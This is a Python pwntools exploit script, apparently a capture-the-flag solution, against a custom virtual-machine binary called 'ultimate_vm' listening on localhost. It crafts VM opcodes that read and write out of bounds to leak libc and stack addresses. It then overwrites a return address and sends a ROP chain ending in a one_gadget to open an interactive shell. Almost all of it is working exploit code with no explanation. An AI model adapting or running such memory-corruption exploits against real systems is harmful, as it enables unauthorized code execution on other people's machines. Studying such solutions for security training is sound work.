#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ultimate_vm
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('ultimate_vm')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)
gdbscript = '''
tbreak main
continue
'''.format(**locals())


class command(object):
    opcode = 0
    op1 = 0
    op2 = 0
    padding = 0
    def __init__(self,opcode,op1,op2,padding):
        self.opcode = opcode
        self.op1 = op1
        self.op2 = op2
        self.padding = padding
        return
    def get_bytes(self):
        cmd = p32((self.opcode)+(self.op1<<8)+(self.op2<<16)+(self.padding<<24))    
        return cmd



MOVRR = 0x10
MOVRM = 0x11
MOVMR = 0x12
IN = 0x20
OUT = 0x21

inx = command(IN,0,0x50,0)
oux = command(OUT,0,0,0)
movrm = command(MOVRM,0xff,0,0)
libc_ovf = command(MOVMR,0,1,0)
stack_ovf = command(MOVMR,0,0x100-12,0)
data_overwrite = command(MOVRM,0x100-6,0,0)
code =b''
code += libc_ovf.get_bytes()
code+=oux.get_bytes()
code+=inx.get_bytes()
code+=stack_ovf.get_bytes()
code+=oux.get_bytes()
code+=inx.get_bytes()
code+=data_overwrite.get_bytes()
code+=inx.get_bytes()

#io = start()
io = remote('localhost',1777)

io.sendline(code)

recvx = io.recvuntil(b'execution...\n')

recvx = io.recv()[:-1]

libc_leak = int.from_bytes(recvx,'little')-0x59765-0x28000

print('Libc leak: '+hex(libc_leak))


io.sendline(b'aaa')

recvx = io.recv()[:-1]

stack_leak = int.from_bytes(recvx,'little') 

print('Stack leak: '+hex(stack_leak))

ret_from_in = stack_leak-0x98

print('Retaddr: '+hex(ret_from_in))

io.sendline(p64(ret_from_in))

one_gadjet = libc_leak+0xebcf8
pop_rsi_ret = libc_leak+0x2be51
pop_rdx_rbx_ret = libc_leak+0x90529

payload = p64(pop_rsi_ret)+p64(0)+p64(pop_rdx_rbx_ret)+p64(0)*2+p64(one_gadjet)

io.sendline(payload)

io.interactive()

